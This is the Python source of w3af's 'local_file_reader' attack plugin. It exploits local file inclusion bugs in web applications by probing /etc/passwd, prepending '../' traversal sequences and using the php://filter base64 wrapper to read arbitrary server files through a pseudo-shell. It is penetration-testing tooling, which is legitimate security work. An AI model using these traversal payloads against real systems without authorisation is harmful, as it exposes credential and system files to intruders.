"""
local_file_reader.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import base64

import w3af.core.controllers.output_manager as om

from w3af.core.data.kb.read_shell import ReadShell
from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
from w3af.core.controllers.misc.levenshtein import relative_distance_ge

from w3af.plugins.attack.payloads.decorators.read_decorator import read_debug


class local_file_reader(AttackPlugin):
    """
    Exploit local file inclusion bugs.
    :author: Andres Riancho (andres.riancho@gmail.com)
    """

    def __init__(self):
        AttackPlugin.__init__(self)

    def get_attack_type(self):
        """
        :return: The type of exploit, SHELL, PROXY, etc.
        """
        return 'shell'

    def get_kb_location(self):
        """
        This method should return the vulnerability names (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds a
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        (attack.os_commanding) should return ['os_commanding',] in this method.
        
        If there is more than one location the implementation should return
        ['a', 'b', ..., 'n']
        """
        return ['lfi',]

    def _generate_shell(self, vuln_obj):
        """
        :param vuln_obj: The vuln to exploit.
        :return: The shell object based on the vulnerability that was passed
                 as a parameter.
        """
        if self._verify_vuln(vuln_obj):

            shell_obj = FileReaderShell(vuln_obj, self._uri_opener,
                                        self.worker_pool,
                                        self._header_length,
                                        self._footer_length)

            return shell_obj

        else:
            return None

    def _verify_vuln(self, vuln_obj):
        """
        This command verifies a vuln.

        :return : True if vuln can be exploited.
        """
        strict = self._strict_with_etc_passwd(vuln_obj)
        if strict:
            return True
        else:
            return self._guess_with_diff(vuln_obj)
        
    
    def _guess_with_diff(self, vuln_obj):
        """
        Try to define the cut with a relaxed algorithm based on two different
        http requests.
        
        :return : True if vuln can be exploited and the information extracted
        """
        function_reference = getattr(self._uri_opener, vuln_obj.get_method())
        #    Prepare the first request, with the original data
        data_a = str(vuln_obj.get_dc())

        #    Prepare the second request, with a non existent file
        vulnerable_parameter = vuln_obj.get_var()
        vulnerable_dc = vuln_obj.get_dc()
        vulnerable_dc_copy = vulnerable_dc.copy()
        vulnerable_dc_copy[vulnerable_parameter] = '/do/not/exist'
        data_b = str(vulnerable_dc_copy)

        try:
            response_a = function_reference(vuln_obj.get_url(), data_a)
            response_b = function_reference(vuln_obj.get_url(), data_b)
        except BaseFrameworkException, e:
            om.out.error(str(e))
            return False
        else:
            if self._guess_cut(response_a.get_body(),
                               response_b.get_body(),
                               vuln_obj['file_pattern']):
                return True
            else:
                return False    
    
    def _strict_with_etc_passwd(self, vuln_obj):
        """
        Try to define the cut with a very strict algorithm based on the
        /etc/passwd file format.
        
        :return : True if vuln can be exploited and the information extracted
        """
        function_reference = getattr(self._uri_opener, vuln_obj.get_method())
        vuln_dc = vuln_obj.get_dc()
        
        # Check if we can apply a stricter extraction method
        if 'passwd' in vuln_obj.get_mutant().get_mod_value():
            try:
                response_a = function_reference(vuln_obj.get_url(), str(vuln_dc),
                                                cache=False)
                response_b = function_reference(vuln_obj.get_url(), str(vuln_dc),
                                                cache=False)
            except BaseFrameworkException, e:
                om.out.error(str(e))
                return False
            
            try:
                cut = self._define_cut_from_etc_passwd(response_a.get_body(),
                                                       response_b.get_body())
            except ValueError, ve:
                om.out.error(str(ve))
                return False
            else:
                return cut

    def get_root_probability(self):
        """
        :return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        """
        return 0.0

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin exploits local file inclusion and let's you "cat" every
        file you want. Remember, if the file in being read with an "include()"
        statement, you wont be able to read the source code of the script file,
        you will end up reading the result of the script interpretation.
        """

PERMISSION_DENIED = 'Permission denied.'
NO_SUCH_FILE = 'No such file or directory.'
READ_DIRECTORY = 'Cannot cat a directory.'
FAILED_STREAM = 'Failed to open stream.'


class FileReaderShell(ReadShell):
    """
    A shell object to exploit local file include and local file read vulns.

    :author: Andres Riancho (andres.riancho@gmail.com)
    """

    def __init__(self, vuln, url_opener, worker_pool, header_len, footer_len):
        super(FileReaderShell, self).__init__(vuln, url_opener, worker_pool)

        self.set_cut(header_len, footer_len)

        self._initialized = False
        self._application_file_not_found_error = None
        self._use_base64_wrapper = False

        self._init_read()

    def _init_read(self):
        """
        This method requires a non existing file, in order to save the error
        message and prevent it to leak as the content of a file to the upper
        layers.

        Example:
            - Application behavior:
                1- (request) http://host.tld/read.php?file=/etc/passwd
                1- (response) "root:x:0:0:root:/root:/bin/bash..."

                2- (request) http://host.tld/read.php?file=/tmp/do_not_exist
                2- (response) "...The file doesn't exist, please try again...'"

            - Before implementing this check, the read method returned "The file
            doesn't exist, please try again" as if it was the content of the
            "/tmp/do_not_exist" file.

            - Now, we handle that case and return an empty string.

        The second thing we do here is to test if the remote site allows us to
        use "php://filter/convert.base64-encode/resource=" for reading files. This
        is very helpful for reading non-text files.
        """
        # Error handling
        app_error = self.read('not_exist0.txt')
        self._application_file_not_found_error = app_error.replace(
            "not_exist0.txt", '')

        # PHP wrapper configuration
        self._use_base64_wrapper = False
        try:
            #FIXME: This only works in Linux!
            response = self._read_with_b64('/etc/passwd')
        except Exception, e:
            msg = 'Not using base64 wrapper for reading because of exception: "%s"'
            om.out.debug(msg % e)
        else:
            if 'root:' in response or '/bin/' in response:
                om.out.debug('Using base64 wrapper for reading.')
                self._use_base64_wrapper = True
            else:
                msg = 'Not using base64 wrapper for reading because response' \
                      ' did not match "root:" or "/bin/".'
                om.out.debug(msg)

    @read_debug
    def read(self, filename):
        """
        Read a file and echo it's content.

        :return: The file content.
        """
        if self._use_base64_wrapper:
            try:
                return self._read_with_b64(filename)
            except Exception, e:
                om.out.debug('read_with_b64 failed: "%s"' % e)

        return self._read_basic(filename)

    def _read_with_b64(self, filename):
        # TODO: Review this hack, does it work every time? What about null bytes?
        filename = '../' * 15 + filename
        filename = 'php://filter/convert.base64-encode/resource=' + filename

        filtered_response = self._read_utils(filename)

        filtered_response = filtered_response.strip()
        filtered_response = base64.b64decode(filtered_response)

        return filtered_response

    def _read_basic(self, filename):
        # TODO: Review this hack, does it work every time? What about null bytes?
        filename = '../' * 15 + filename
        filtered_response = self._read_utils(filename)
        return filtered_response

    def _read_utils(self, filename):
        """
        Actually perform the request to the remote server and returns the response
        for parsing by the _read_with_b64 or _read_basic methods.
        """
        function_reference = getattr(self._uri_opener, self.get_method())
        data_container = self.get_dc().copy()
        data_container[self.get_var()] = filename
        try:
            response = function_reference(
                self.get_url(), str(data_container))
        except BaseFrameworkException, e:
            msg = 'Error "%s" while sending request to remote host. Try again.'
            return msg % e
        else:
            cutted_response = self._cut(response.get_body())
            filtered_response = self._filter_errors(cutted_response, filename)

            return filtered_response

    def _filter_errors(self, result, filename):
        """
        Filter out ugly php errors and print a simple "Permission denied"
        or "File not found"
        """
        #print filename
        error = None

        if result.count('Permission denied'):
            error = PERMISSION_DENIED
        elif result.count('No such file or directory in'):
            error = NO_SUCH_FILE
        elif result.count('Not a directory in'):
            error = READ_DIRECTORY
        elif result.count(': failed to open stream: '):
            error = FAILED_STREAM

        elif self._application_file_not_found_error is not None:
            # The result string has the file I requested inside, so I'm going
            # to remove it.
            clean_result = result.replace(filename, '')

            # Now I compare both strings, if they are VERY similar, then
            # filename is a non existing file.
            if relative_distance_ge(self._application_file_not_found_error,
                                    clean_result, 0.9):
                error = NO_SUCH_FILE

        #
        #    I want this function to return an empty string on errors.
        #    Not the error itself.
        #
        if error is not None:
            return ''

        return result

    def get_name(self):
        """
        :return: The name of this shell.
        """
        return 'local_file_reader'
